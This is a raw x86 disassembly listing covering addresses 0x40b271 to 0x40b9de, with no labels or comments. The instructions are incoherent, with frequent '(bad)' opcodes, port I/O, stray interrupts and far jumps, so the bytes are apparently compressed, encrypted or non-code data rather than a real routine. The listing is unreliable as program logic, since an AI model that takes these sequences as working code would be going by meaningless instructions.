  40b271:	adc    DWORD PTR [eiz*1+0x72864c7a],edi
  40b278:	jp     0x40b239
  40b27a:	and    al,0x24
  40b27c:	adc    BYTE PTR [edi+0x56],0x2
  40b280:	xor    BYTE PTR [esi+0x5f219ee7],dl
  40b286:	cmp    DWORD PTR [edx+0x47],ebx
  40b289:	add    BYTE PTR [eax-0x7d],ah
  40b28c:	data16 mov bl,0x8c
  40b28f:	xor    al,0x5d
  40b291:	pop    ss
  40b292:	cmp    esp,0x1367fe74
  40b298:	ret    0xbe59
  40b29b:	inc    edi
  40b29c:	cmp    BYTE PTR [esi],al
  40b29e:	cmp    bl,BYTE PTR [edx-0x459f6d22]
  40b2a4:	adc    eax,0x9acde346
  40b2a9:	mov    esi,0x2d8b3c7d
  40b2ae:	mov    ds:0x8a6b0887,al
  40b2b3:	mov    ch,0xdb
  40b2b5:	add    bl,BYTE PTR [edx+0x72]
  40b2b8:	cdq    
  40b2b9:	adc    eax,0x93478495
  40b2be:	cmc    
  40b2bf:	aaa    
  40b2c0:	ret    0xb99b
  40b2c3:	pop    eax
  40b2c4:	dec    ecx
  40b2c5:	fs jge 0x40b2cb
  40b2c8:	daa    
  40b2c9:	dec    edi
  40b2ca:	call   FWORD PTR [ebx-0x1878a454]
  40b2d0:	das    
  40b2d1:	aam    0x4e
  40b2d3:	pop    es
  40b2d4:	es inc ebx
  40b2d6:	lods   eax,DWORD PTR ds:[esi]
  40b2d7:	mov    bh,0x5e
  40b2d9:	leave  
  40b2da:	lods   eax,DWORD PTR ds:[esi]
  40b2db:	xchg   DWORD PTR [ebx],esp
  40b2dd:	fnstenv [ebx-0x479dba51]
  40b2e3:	in     al,dx
  40b2e4:	dec    ebx
  40b2e5:	sub    eax,0xd964862f
  40b2ea:	cmp    BYTE PTR ds:0x20acdec7,ah
  40b2f0:	js     0x40b2c6
  40b2f2:	push   edx
  40b2f3:	pop    edx
  40b2f4:	inc    esp
  40b2f5:	inc    esp
  40b2f6:	ret    
  40b2f7:	xor    al,0xa2
  40b2f9:	jbe    0x40b317
  40b2fb:	loopne 0x40b2dc
  40b2fd:	lods   al,BYTE PTR ds:[esi]
  40b2fe:	shl    bh,cl
  40b300:	xor    ebp,DWORD PTR [ecx+0x7a]
  40b303:	push   ds
  40b304:	mov    eax,0xd1548601
  40b309:	fdiv   DWORD PTR [esi-0x2a70a3b5]
  40b30f:	pop    ds
  40b310:	ins    DWORD PTR es:[edi],dx
  40b311:	adc    ah,BYTE PTR [edi+0x61]
  40b314:	cmp    DWORD PTR [ecx],0xd
  40b317:	jg     0x40b2c7
  40b319:	adc    eax,0xd1f484e7
  40b31e:	fwait
  40b31f:	aad    0x35
  40b321:	fwait
  40b322:	stc    
  40b323:	mov    BYTE PTR [ecx],bh
  40b325:	add    esi,ebx
  40b327:	add    al,0x57
  40b329:	or     eax,0x853be56d
  40b32e:	mov    dh,0x1e
  40b330:	es add al,0xa1
  40b333:	popa   
  40b334:	(bad)  
  40b335:	adc    eax,0x78959198
  40b33a:	in     al,dx
  40b33b:	adc    ch,cl
  40b33d:	repnz dec ebp
  40b33f:	or     bh,dl
  40b341:	mov    BYTE PTR [ebp+0x68f4819d],bh
  40b347:	aam    0xf3
  40b349:	cmp    ecx,ecx
  40b34b:	xchg   ecx,eax
  40b34c:	xchg   BYTE PTR [eax-0x667a36fb],ch
  40b352:	(bad)  
  40b353:	xchg   ebx,eax
  40b354:	push   ds
  40b355:	stc    
  40b356:	add    BYTE PTR [eax-0x326999de],dh
  40b35c:	or     eax,0xd4ae5d76
  40b361:	hlt    
  40b362:	xor    BYTE PTR [ebx+0x516d5d06],cl
  40b368:	cmc    
  40b369:	and    DWORD PTR [esp+ebx*1-0x1],ebp
  40b36d:	adc    edx,DWORD PTR [ebp-0x536f4db6]
  40b373:	int    0xff
  40b375:	rcr    BYTE PTR [edi+0x5f],1
  40b378:	inc    edx
  40b379:	push   es
  40b37a:	out    0x4f,eax
  40b37c:	scas   al,BYTE PTR es:[edi]
  40b37d:	sbb    BYTE PTR [edx+0x4],dl
  40b380:	iret   
  40b381:	cmp    DWORD PTR [eax+0x1e9cd3ff],ebp
  40b387:	fwait
  40b388:	sbb    al,0x79
  40b38a:	cmp    eax,0x693fa5c9
  40b38f:	ins    DWORD PTR es:[edi],dx
  40b390:	int    0x3b
  40b392:	sub    edi,DWORD PTR [edi]
  40b394:	nop
  40b395:	adc    eax,0x71ed5d10
  40b39a:	mov    BYTE PTR [esi+0x42deff26],ch
  40b3a0:	xchg   ecx,eax
  40b3a1:	jmp    0x40b391
  40b3a3:	push   0x71
  40b3a5:	ficom  DWORD PTR [eax-0x22]
  40b3a8:	jne    0x40b392
  40b3aa:	into   
  40b3ab:	popa   
  40b3ac:	out    0x9f,al
  40b3ae:	hlt    
  40b3af:	call   DWORD PTR [eax]
  40b3b1:	xchg   esp,eax
  40b3b2:	sub    al,0x8c
  40b3b4:	or     eax,0x946968a6
  40b3b9:	ficom  WORD PTR [edx]
  40b3bb:	mov    ch,0x9
  40b3bd:	call   0x8a34:0x76cc9dc7
  40b3c4:	mov    bl,0x3b
  40b3c6:	jb     0x40b3ff
  40b3c8:	sub    bh,dh
  40b3ca:	xor    edx,ecx
  40b3cc:	loopne 0x40b417
  40b3ce:	clc    
  40b3cf:	mov    ecx,0xa1ec2b08
  40b3d4:	in     eax,dx
  40b3d5:	ins    DWORD PTR es:[edi],dx
  40b3d6:	pop    ecx
  40b3d7:	pushf  
  40b3d8:	test   eax,0x9f1c313f
  40b3dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3de:	lods   eax,DWORD PTR ds:[esi]
  40b3df:	cwde   
  40b3e0:	int    0x13
  40b3e2:	bound  edx,QWORD PTR [eax+0x23]
  40b3e5:	rcl    DWORD PTR [eax],cl
  40b3e7:	xchg   esp,eax
  40b3e8:	scas   eax,DWORD PTR es:[edi]
  40b3e9:	fmul   QWORD PTR [eax-0x22a28ffd]
  40b3ef:	adc    bh,BYTE PTR [edi-0x628b0ccc]
  40b3f5:	sahf   
  40b3f6:	dec    esi
  40b3f7:	push   edx
  40b3f8:	je     0x40b42e
  40b3fa:	jmp    0x1e1cb44
  40b3ff:	fcomp  DWORD PTR [ebx]
  40b401:	mov    eax,DWORD PTR [eax+0x37b63cea]
  40b407:	and    DWORD PTR [esi+ebx*8-0x15],0x25
  40b40c:	das    
  40b40d:	int3   
  40b40e:	pop    ebp
  40b40f:	addr16 popf 
  40b411:	sbb    eax,0x74e131f9
  40b416:	jnp    0x40b44b
  40b418:	adc    DWORD PTR [ebx+0x11],eax
  40b41b:	dec    edx
  40b41c:	sbb    BYTE PTR ds:[edx+0x13],bl
  40b420:	jge    0x40b446
  40b422:	mov    cl,0xeb
  40b424:	sbb    al,0x8a
  40b426:	mov    ch,0x45
  40b428:	push   0xfdaaab68
  40b42d:	call   FWORD PTR [ecx]
  40b42f:	mov    BYTE PTR [edx+0x6ac66614],dh
  40b435:	ret    
  40b436:	sbb    al,0x64
  40b438:	pop    edx
  40b439:	jl     0x40b3ee
  40b43b:	out    dx,eax
  40b43c:	dec    ebp
  40b43d:	push   0x30c356e2
  40b442:	(bad)  
  40b443:	sbb    BYTE PTR [eax-0x6398eec9],dh
  40b449:	xchg   edi,eax
  40b44a:	inc    ebp
  40b44b:	in     al,0x2b
  40b44d:	add    BYTE PTR [edi],al
  40b44f:	jo     0x40b467
  40b451:	mov    dl,0x43
  40b453:	push   eax
  40b454:	out    dx,eax
  40b455:	mov    bh,0xad
  40b457:	call   0xaad2fb9
  40b45c:	sbb    BYTE PTR [esi+eiz*8],0xaa
  40b460:	or     eax,0xb194dac5
  40b465:	and    DWORD PTR [ecx+0x2d],ebx
  40b468:	in     al,dx
  40b469:	push   edx
  40b46a:	and    eax,0x1e8a3897
  40b46f:	call   0x14b859c4
  40b474:	xchg   ecx,edi
  40b476:	and    dh,dl
  40b478:	retf   0x9533
  40b47b:	es fxam 
  40b47e:	mov    ds:0x9cf693a8,al
  40b483:	add    ch,BYTE PTR [ebx+edx*8-0x3e]
  40b487:	int    0xbb
  40b489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b48a:	sub    BYTE PTR [edi+0x595ef0cf],0xca
  40b491:	adc    eax,0xe7c2b50f
  40b496:	in     al,dx
  40b497:	call   0x8fb0:0xd5934586
  40b49e:	push   edx
  40b49f:	popf   
  40b4a0:	ins    DWORD PTR es:[edi],dx
  40b4a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4a2:	push   0x26
  40b4a4:	into   
  40b4a5:	jge    0x40b430
  40b4a7:	cmp    BYTE PTR [esi+0x21a1c843],dl
  40b4ad:	stc    
  40b4ae:	les    eax,FWORD PTR [edi]
  40b4b0:	sbb    DWORD PTR [eax],edx
  40b4b2:	or     al,0x54
  40b4b4:	add    BYTE PTR [ebp+0x23],dl
  40b4b7:	xor    DWORD PTR [ebx+0x17083ade],ebp
  40b4bd:	neg    BYTE PTR [esi+0x36ec1c65]
  40b4c3:	arpl   bx,si
  40b4c5:	fwait
  40b4c6:	imul   esp,DWORD PTR [edx],0x59
  40b4c9:	or     eax,0xbebb7e94
  40b4ce:	cli    
  40b4cf:	pop    ds
  40b4d0:	adc    al,0xf6
  40b4d2:	stos   BYTE PTR es:[edi],al
  40b4d3:	imul   edx,DWORD PTR [edi],0x3c1b0b67
  40b4d9:	mul    dh
  40b4db:	aas    
  40b4dc:	add    DWORD PTR [ecx-0x25bb27a8],esp
  40b4e2:	adc    eax,0x6b3682c7
  40b4e7:	enter  0xecaf,0xb7
  40b4eb:	push   ss
  40b4ec:	sbb    eax,0xa0fe0a92
  40b4f1:	mov    ecx,0xadd9014
  40b4f6:	fist   DWORD PTR [esp+edi*8]
  40b4f9:	out    0xc5,eax
  40b4fb:	xchg   ebp,eax
  40b4fc:	or     eax,0x3c73b4d5
  40b501:	add    eax,0xa567c54c
  40b506:	adc    BYTE PTR [edi-0x45aa2af6],al
  40b50c:	mov    ebx,0xf2291414
  40b511:	out    0x91,al
  40b513:	and    BYTE PTR [ebx-0x13],0xb3
  40b517:	in     al,0x7b
  40b519:	sub    al,0x21
  40b51b:	ret    
  40b51c:	mov    ds:0x80885d86,eax
  40b521:	push   ss
  40b522:	fcom   QWORD PTR [ebx]
  40b524:	mov    ?,edi
  40b526:	mov    bh,0xdf
  40b528:	iret   
  40b529:	mov    al,BYTE PTR [edx-0x1ace5a42]
  40b52f:	cld    
  40b530:	(bad)  [esi+0x4a]
  40b533:	pop    ebx
  40b534:	sub    eax,0xb0722108
  40b539:	mov    dh,0xc6
  40b53b:	add    eax,DWORD PTR ds:0x7ebf4fa6
  40b541:	sub    BYTE PTR [esi+eiz*2+0x3e],bl
  40b545:	add    al,0x24
  40b547:	inc    eax
  40b548:	dec    esp
  40b549:	das    
  40b54a:	into   
  40b54b:	lock outs dx,DWORD PTR ds:[esi]
  40b54d:	iret   
  40b54e:	lods   al,BYTE PTR ds:[esi]
  40b54f:	fs aaa 
  40b551:	sbb    bh,BYTE PTR [ecx]
  40b553:	shr    BYTE PTR [eax-0x40989da2],0xf9
  40b55a:	lahf   
  40b55b:	aaa    
  40b55c:	mov    BYTE PTR [ecx+0x13f42e42],dh
  40b562:	mov    bl,BYTE PTR [edx*4+0x57943546]
  40b569:	jne    0x40b51e
  40b56b:	adc    DWORD PTR [ebx],0x52
  40b56e:	cmp    ah,BYTE PTR [ebp+0x74]
  40b571:	jl     0x40b50c
  40b573:	xchg   DWORD PTR [ecx+eiz*4+0x47],esp
  40b577:	push   esi
  40b578:	cmp    eax,0xbc46478
  40b57d:	mov    bh,0x2
  40b57f:	lds    edi,FWORD PTR [ecx]
  40b581:	data16 or BYTE PTR [edx],0x4a
  40b585:	(bad)  
  40b586:	(bad)  
  40b588:	jg     0x40b5a4
  40b58a:	xor    esp,DWORD PTR [edi-0x71ce0dd0]
  40b590:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40b592:	and    DWORD PTR ds:0xf45d6531,edi
  40b598:	das    
  40b599:	enter  0xcd73,0x67
  40b59d:	aas    
  40b59e:	fs jmp 0xbe06f8ce
  40b5a4:	pmulhuw mm4,QWORD PTR [edx]
  40b5a7:	xchg   esi,eax
  40b5a8:	and    DWORD PTR [ebp+0x21],esi
  40b5ab:	fdivr  st,st(3)
  40b5ad:	mov    al,BYTE PTR [edx-0x6c]
  40b5b0:	dec    edi
  40b5b1:	mov    al,BYTE PTR [edi]
  40b5b3:	xchg   ecx,eax
  40b5b4:	mov    edx,ebx
  40b5b6:	xchg   edi,eax
  40b5b7:	aas    
  40b5b8:	add    ebx,DWORD PTR [eax-0x5]
  40b5bb:	lea    eax,[edi-0x1ba6ad23]
  40b5c1:	pop    eax
  40b5c2:	std    
  40b5c3:	aas    
  40b5c4:	push   cs
  40b5c5:	sbb    esi,DWORD PTR es:[eax]
  40b5c8:	sbb    ecx,ebx
  40b5ca:	pusha  
  40b5cb:	mov    bh,0x50
  40b5cd:	test   edx,edi
  40b5cf:	mov    eax,ds:0xd5fd4817
  40b5d4:	push   ds
  40b5d5:	in     al,0xe1
  40b5d7:	mov    ah,bl
  40b5d9:	add    dl,dh
  40b5db:	addr16 xchg esi,eax
  40b5dd:	adc    ebx,DWORD PTR [ebx-0x67d5b663]
  40b5e3:	jecxz  0x40b5cb
  40b5e5:	in     eax,0x86
  40b5e7:	or     dl,BYTE PTR [eax+eiz*4-0x5b]
  40b5eb:	mov    WORD PTR [eax+0x6222411f],?
  40b5f1:	mov    dl,0x40
  40b5f3:	int    0x6c
  40b5f5:	scas   al,BYTE PTR es:[edi]
  40b5f6:	sub    dh,dh
  40b5f8:	jmp    0xb200:0x526d798e
  40b5ff:	cmc    
  40b600:	mov    ecx,fs
  40b602:	push   ds
  40b603:	add    eax,0x53e89db
  40b608:	shl    DWORD PTR [ecx+0x6ac36281],cl
  40b60e:	push   0xb0e9c871
  40b613:	xchg   edx,eax
  40b614:	add    al,0x32
  40b616:	rcr    DWORD PTR [ecx-0x51],cl
  40b619:	dec    edi
  40b61a:	and    bh,dl
  40b61c:	outs   dx,DWORD PTR ds:[esi]
  40b61d:	pop    esp
  40b61e:	jg     0x40b5d5
  40b620:	add    cl,ch
  40b622:	repz loope 0x40b62b
  40b625:	jns    0x40b69f
  40b627:	loopne 0x40b647
  40b629:	sub    eax,0x4621ccee
  40b62e:	mov    al,ds:0x4df49526
  40b633:	shl    cl,1
  40b635:	outs   dx,DWORD PTR ds:[esi]
  40b636:	arpl   WORD PTR [ecx-0x34],sp
  40b639:	fcmovnbe st,st(7)
  40b63b:	lods   eax,DWORD PTR ds:[esi]
  40b63c:	cmp    ecx,DWORD PTR [ebp+0x37]
  40b63f:	inc    BYTE PTR [ebp-0x4dab0503]
  40b645:	sbb    al,0xb8
  40b647:	xlat   BYTE PTR ds:[ebx]
  40b648:	ja     0x40b623
  40b64a:	push   ds
  40b64b:	adc    eax,0x9d7fb5d2
  40b650:	or     eax,0xcf0c606d
  40b655:	fs js  0x40b661
  40b658:	add    esp,ebx
  40b65a:	rcr    BYTE PTR [ebp+0x7b],1
  40b65d:	in     eax,dx
  40b65e:	sbb    al,0x31
  40b660:	xor    WORD PTR [eax+0x26],si
  40b664:	sbb    dl,BYTE PTR gs:[edx]
  40b667:	cmc    
  40b668:	push   ebx
  40b669:	push   eax
  40b66a:	je     0x40b607
  40b66c:	dec    edi
  40b66d:	push   ebp
  40b66e:	and    BYTE PTR [edx],ch
  40b670:	or     BYTE PTR [ecx+0x32e47b62],0x1
  40b677:	mov    DWORD PTR [edi-0x19],edi
  40b67a:	adc    eax,0x71317b90
  40b67f:	cld    
  40b680:	sbb    DWORD PTR [ebx],ebp
  40b682:	loopne 0x40b702
  40b684:	pop    ecx
  40b686:	shl    DWORD PTR [esi-0x64],cl
  40b689:	push   ds
  40b68a:	aaa    
  40b68b:	pop    edx
  40b68c:	dec    ebp
  40b68d:	(bad)  
  40b68e:	fsub   QWORD PTR [eax-0x7d]
  40b691:	scas   eax,DWORD PTR es:[edi]
  40b692:	pop    ebx
  40b693:	fs loopne 0x40b6b5
  40b696:	mov    bl,0x27
  40b698:	add    BYTE PTR [ebp+edx*1+0x3301510e],bl
  40b69f:	cmp    DWORD PTR [edx+0x493dae4f],ebx
  40b6a5:	hlt    
  40b6a6:	add    DWORD PTR [ebx+0x5],0xd8e56092
  40b6ad:	lea    ebx,[ebx+ecx*4]
  40b6b0:	mov    ebx,0x71013c05
  40b6b5:	jmp    0xc7d83b5a
  40b6ba:	mov    BYTE PTR [ebx-0x3d],0x4f
  40b6be:	inc    eax
  40b6bf:	(bad)  
  40b6c1:	jp     0x40b6ce
  40b6c3:	dec    ecx
  40b6c4:	add    al,0xb1
  40b6c6:	xor    ah,BYTE PTR [eax-0x3133a24c]
  40b6cc:	sbb    al,0x55
  40b6ce:	ins    DWORD PTR es:[edi],dx
  40b6cf:	inc    edx
  40b6d0:	push   0xffffffd4
  40b6d2:	stc    
  40b6d3:	sbb    eax,0x5e11ecab
  40b6d8:	push   ss
  40b6d9:	fs inc ecx
  40b6db:	mov    WORD PTR [edx],gs
  40b6dd:	pop    gs
  40b6df:	jle    0x40b745
  40b6e1:	sub    al,0x77
  40b6e3:	ror    DWORD PTR [esi-0x6ccb3e5c],0x70
  40b6ea:	into   
  40b6eb:	pop    ebx
  40b6ec:	mov    edi,0x343bf42f
  40b6f1:	(bad)  
  40b6f2:	pushf  
  40b6f3:	sti    
  40b6f4:	stos   DWORD PTR es:[edi],eax
  40b6f5:	(bad)  
  40b6f6:	loopne 0x40b771
  40b6f8:	pop    esp
  40b6f9:	jne    0x40b6ad
  40b6fb:	stos   BYTE PTR es:[edi],al
  40b6fc:	adc    eax,0xb921eee2
  40b701:	int3   
  40b702:	je     0x40b6f7
  40b704:	rcr    edx,cl
  40b706:	fmul   QWORD PTR [esi]
  40b708:	mov    eax,ds:0xd97acb71
  40b70d:	push   ebp
  40b70e:	fnstenv [ecx+0x28]
  40b711:	jecxz  0x40b69c
  40b713:	mov    ebp,0x7afe99d1
  40b718:	lds    ecx,FWORD PTR [edi+0x6b]
  40b71b:	push   ebx
  40b71c:	xchg   BYTE PTR [eax-0x44b54b52],dl
  40b722:	push   edi
  40b723:	xlat   BYTE PTR ds:[ebx]
  40b724:	movsx  edx,cl
  40b727:	push   ebp
  40b728:	mov    fs,edx
  40b72a:	test   al,0xb
  40b72c:	out    0x58,eax
  40b72e:	mov    ebp,0xa958b4ad
  40b733:	jmp    0x1647:0xd6745343
  40b73a:	pop    esp
  40b73b:	sbb    ebp,edx
  40b73d:	push   cs
  40b73e:	xor    al,0xa
  40b740:	call   0xf711f58a
  40b745:	mov    al,0x79
  40b747:	popf   
  40b748:	cdq    
  40b749:	inc    eax
  40b74a:	cwde   
  40b74b:	(bad)  
  40b74c:	loopne 0x40b749
  40b74e:	scas   eax,DWORD PTR es:[edi]
  40b74f:	iret   
  40b750:	mov    ds:0xf899a9c,eax
  40b755:	or     al,cl
  40b757:	ret    0xd03f
  40b75a:	imul   edi,DWORD PTR [eax-0x188c4dd2],0x914245d8
  40b764:	push   ebx
  40b765:	loope  0x40b724
  40b767:	sub    eax,0xf8fad7be
  40b76c:	xor    al,0x3a
  40b76e:	adc    ecx,eax
  40b770:	pop    esi
  40b771:	ins    BYTE PTR es:[edi],dx
  40b772:	jmp    0xbeee8a3a
  40b777:	lods   al,BYTE PTR ds:[esi]
  40b778:	daa    
  40b779:	frstor [edi]
  40b77b:	stc    
  40b77c:	pop    es
  40b77d:	sbb    BYTE PTR [edi+0x40b68d],cl
  40b783:	cmp    al,0x56
  40b785:	mov    ah,0x1c
  40b787:	(bad)  
  40b788:	rol    cl,0x90
  40b78b:	mov    bh,0xbb
  40b78d:	(bad)  
  40b78e:	(bad)  
  40b78f:	push   ecx
  40b790:	es xchg edx,eax
  40b792:	jbe    0x40b7e7
  40b794:	repz sub ebp,DWORD PTR ds:0x75fc7f4b
  40b79b:	aas    
  40b79c:	idiv   DWORD PTR [esi+ebx*4+0x55]
  40b7a0:	sbb    ebp,esp
  40b7a2:	outs   dx,DWORD PTR ds:[esi]
  40b7a3:	sbb    eax,0x1b9262ad
  40b7a8:	or     DWORD PTR [eax+0x1d],ebx
  40b7ab:	adc    dh,BYTE PTR [edi-0x61218fa6]
  40b7b1:	shr    BYTE PTR [ecx],0x6e
  40b7b4:	ds out dx,eax
  40b7b6:	hlt    
  40b7b7:	xchg   esi,eax
  40b7b8:	pop    esi
  40b7b9:	leave  
  40b7ba:	inc    esp
  40b7bb:	ror    BYTE PTR [esi-0x21e76f75],1
  40b7c1:	inc    edi
  40b7c2:	mov    al,0x33
  40b7c4:	rcl    dl,cl
  40b7c6:	in     al,0x91
  40b7c8:	fs jecxz 0x40b7e2
  40b7cb:	fidivr WORD PTR [ebx-0x328a3ddb]
  40b7d1:	or     BYTE PTR [ebx+0x6ff9a2e2],dl
  40b7d7:	mov    dl,0x93
  40b7d9:	jge    0x40b7ea
  40b7db:	jmp    0xde9c:0xbad9d4b0
  40b7e2:	sbb    ecx,DWORD PTR [esi+0x67ec526c]
  40b7e8:	jle    0x40b7df
  40b7ea:	jnp    0x40b82b
  40b7ec:	fld    TBYTE PTR [esi+0x22f93ce4]
  40b7f2:	xor    BYTE PTR [esp+esi*2-0x21e85732],dl
  40b7f9:	gs lock je 0x40b848
  40b7fd:	and    al,BYTE PTR [edi-0x3b671b4e]
  40b803:	and    esi,ebx
  40b805:	int    0xb4
  40b807:	sahf   
  40b808:	ja     0x40b882
  40b80a:	add    al,0x68
  40b80c:	cmp    BYTE PTR [eax],dl
  40b80e:	sbb    DWORD PTR [esi+0x77096670],edi
  40b814:	outs   dx,DWORD PTR ds:[esi]
  40b815:	mov    cx,0x5803
  40b819:	lods   al,BYTE PTR cs:[esi]
  40b81b:	pop    ss
  40b81c:	xchg   esi,eax
  40b81d:	jb     0x40b823
  40b81f:	popa   
  40b820:	add    BYTE PTR [ecx+0x16f2b622],dl
  40b826:	or     BYTE PTR [esi],dh
  40b828:	das    
  40b829:	mov    dh,0x4e
  40b82b:	ins    DWORD PTR es:[edi],dx
  40b82c:	sti    
  40b82d:	stos   BYTE PTR es:[edi],al
  40b82e:	inc    ebx
  40b82f:	fidivr DWORD PTR [ebp-0xdfe9adf]
  40b835:	std    
  40b836:	mov    ch,0x1b
  40b838:	xchg   ecx,eax
  40b839:	out    0xa7,al
  40b83b:	fmul   QWORD PTR [esi+edi*1+0x5a03d833]
  40b842:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b843:	rcl    DWORD PTR [eax+0x4e97d810],1
  40b849:	push   ss
  40b84a:	stos   BYTE PTR es:[edi],al
  40b84b:	pop    esi
  40b84c:	out    0x9d,eax
  40b84e:	leave  
  40b84f:	scas   al,BYTE PTR es:[edi]
  40b850:	fdiv   QWORD PTR [edi-0x900dc5b]
  40b856:	push   cs
  40b857:	in     eax,0x99
  40b859:	les    ebx,FWORD PTR [ebx]
  40b85b:	pushf  
  40b85c:	push   eax
  40b85d:	xchg   esi,eax
  40b85e:	pop    es
  40b85f:	push   eax
  40b860:	sahf   
  40b861:	fwait
  40b862:	cmp    DWORD PTR [eax-0x958cc8],ebx
  40b868:	xchg   BYTE PTR [edx+0x26],ch
  40b86b:	(bad)  
  40b86c:	in     al,0xa5
  40b86e:	jg     0x40b8bc
  40b870:	aas    
  40b871:	jp     0x40b80d
  40b873:	mov    eax,0xf3be12f3
  40b878:	sbb    al,0x66
  40b87a:	das    
  40b87b:	mov    cs,WORD PTR [edi+0xf]
  40b87e:	mov    esi,0x1a20c8a7
  40b883:	jge    0x40b830
  40b885:	loope  0x40b8c8
  40b887:	test   DWORD PTR [esp+esi*4-0x1f],edi
  40b88b:	pop    eax
  40b88c:	cmp    bl,bl
  40b88e:	or     ecx,DWORD PTR [ebp-0x316d4ae5]
  40b894:	mov    dh,0xb3
  40b896:	mov    esi,0xd8bfc23
  40b89b:	push   esi
  40b89c:	xchg   ecx,eax
  40b89d:	out    0xf7,al
  40b89f:	pop    ebp
  40b8a0:	dec    eax
  40b8a1:	das    
  40b8a2:	pop    edi
  40b8a3:	mov    esi,0xc3298f5
  40b8a8:	loopne 0x40b8f3
  40b8aa:	cmp    esi,eax
  40b8ac:	and    BYTE PTR [eax],ch
  40b8ae:	imul   edx,DWORD PTR [esi+0x6d8f925e],0x7e012404
  40b8b8:	into   
  40b8b9:	sbb    DWORD PTR [edx-0x5f],eax
  40b8bc:	sahf   
  40b8bd:	mov    ecx,0xa665883a
  40b8c2:	mov    dh,dl
  40b8c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8c5:	in     al,dx
  40b8c6:	pop    eax
  40b8c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8c8:	test   BYTE PTR [edx+0xa],dh
  40b8cb:	adc    eax,DWORD PTR [edx-0x29]
  40b8ce:	xor    ch,BYTE PTR [edx]
  40b8d0:	inc    ecx
  40b8d1:	xchg   ecx,eax
  40b8d2:	jge    0x40b8e1
  40b8d4:	stos   DWORD PTR es:[edi],eax
  40b8d5:	lods   eax,DWORD PTR ds:[esi]
  40b8d6:	sub    ecx,DWORD PTR ds:0x32f7593c
  40b8dc:	lock aam 0x94
  40b8df:	ds in  al,0xd7
  40b8e2:	sbb    DWORD PTR [eax-0x45],ebx
  40b8e5:	push   ebp
  40b8e6:	mov    ah,0xd7
  40b8e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8e9:	jo     0x40b94a
  40b8eb:	push   ss
  40b8ec:	jnp    0x40b881
  40b8ee:	sbb    BYTE PTR [ebx+0x70f36b10],0x20
  40b8f5:	div    DWORD PTR [ebp-0x25d0f6bc]
  40b8fb:	and    DWORD PTR ds:0x96ef8546,edx
  40b901:	dec    eax
  40b902:	pop    ebp
  40b903:	add    cl,bh
  40b905:	mov    ah,bl
  40b907:	pop    edi
  40b908:	or     cl,BYTE PTR [edi+0x34]
  40b90b:	mov    edx,0xb3b89b61
  40b910:	sti    
  40b911:	xor    BYTE PTR [ebx],ch
  40b913:	inc    eax
  40b914:	xor    DWORD PTR [ebx+0x79088d9e],0x388cec0
  40b91e:	dec    esi
  40b91f:	stc    
  40b920:	jo     0x40b961
  40b922:	clc    
  40b923:	ret    
  40b924:	ffree  st(7)
  40b926:	xchg   edx,eax
  40b927:	sub    al,BYTE PTR [esi-0x19125df4]
  40b92d:	inc    esi
  40b92e:	mov    edi,DWORD PTR [edx]
  40b930:	dec    esp
  40b931:	not    BYTE PTR [ebp+0x56092438]
  40b937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b938:	(bad)  
  40b939:	enter  0x466d,0x5
  40b93d:	aas    
  40b93e:	or     al,0x1f
  40b940:	je     0x40b927
  40b942:	scas   eax,DWORD PTR es:[edi]
  40b943:	scas   eax,DWORD PTR es:[edi]
  40b944:	push   esp
  40b945:	bound  edx,QWORD PTR [ebx]
  40b947:	fidiv  WORD PTR [esi]
  40b949:	cli    
  40b94a:	dec    esi
  40b94b:	mov    ebx,0xded30446
  40b950:	mov    esp,0xa5c3a38d
  40b955:	cld    
  40b956:	inc    edi
  40b957:	jecxz  0x40b999
  40b959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b95a:	mov    ds:0xfc6e475b,al
  40b95f:	scas   al,BYTE PTR es:[edi]
  40b960:	stos   BYTE PTR es:[edi],al
  40b961:	jge    0x40b95b
  40b963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b964:	pmulhw mm4,QWORD PTR [ecx+eiz*4+0x3]
  40b969:	js     0x40b962
  40b96b:	popa   
  40b96c:	add    ah,BYTE PTR [ebx]
  40b96e:	cwde   
  40b96f:	cmc    
  40b970:	daa    
  40b971:	jmp    0xda6a1a13
  40b976:	cli    
  40b977:	xchg   edi,eax
  40b978:	adc    DWORD PTR [edi],eax
  40b97a:	pop    ss
  40b97b:	stos   DWORD PTR es:[edi],eax
  40b97c:	adc    eax,0xb0be8458
  40b981:	push   ds
  40b982:	adc    dl,BYTE PTR [ebx]
  40b984:	ds add dh,bh
  40b987:	cli    
  40b988:	pop    ds
  40b989:	enter  0x7f13,0x38
  40b98d:	dec    esi
  40b98e:	cmp    BYTE PTR [esi],dl
  40b990:	call   0x298f7375
  40b995:	xchg   edi,eax
  40b996:	pusha  
  40b997:	dec    esp
  40b998:	retf   0x4cb5
  40b99b:	xchg   esi,eax
  40b99c:	ins    DWORD PTR es:[edi],dx
  40b99d:	xchg   edx,eax
  40b99e:	cli    
  40b99f:	pop    esp
  40b9a0:	sub    BYTE PTR [edx],0x7b
  40b9a3:	es out dx,eax
  40b9a5:	aas    
  40b9a6:	mov    ebx,0xe3bb8fd2
  40b9ab:	mov    cl,0x48
  40b9ad:	clc    
  40b9ae:	cmp    bl,dh
  40b9b0:	imul   BYTE PTR [ecx]
  40b9b2:	imul   esp,DWORD PTR [ecx+0x42],0xa8b1371c
  40b9b9:	mov    esp,0xd8bd7a5f
  40b9be:	xor    al,BYTE PTR [edx+0x13]
  40b9c1:	and    esi,edx
  40b9c3:	mov    edi,0xef8f3c5
  40b9c8:	jp     0x40ba3f
  40b9ca:	sti    
  40b9cb:	inc    ebp
  40b9cc:	adc    al,0xf8
  40b9cf:	push   0x27
  40b9d1:	and    ebp,DWORD PTR [edi+0x7f5f2b00]
  40b9d7:	pop    ebx
  40b9d8:	(bad)  
  40b9d9:	stos   BYTE PTR es:[edi],al
  40b9da:	xchg   edx,eax
  40b9db:	xor    al,0x72
  40b9dd:	push   edx
  40b9de:	adc    ah,BYTE PTR [eax-0xf6ae0b5]
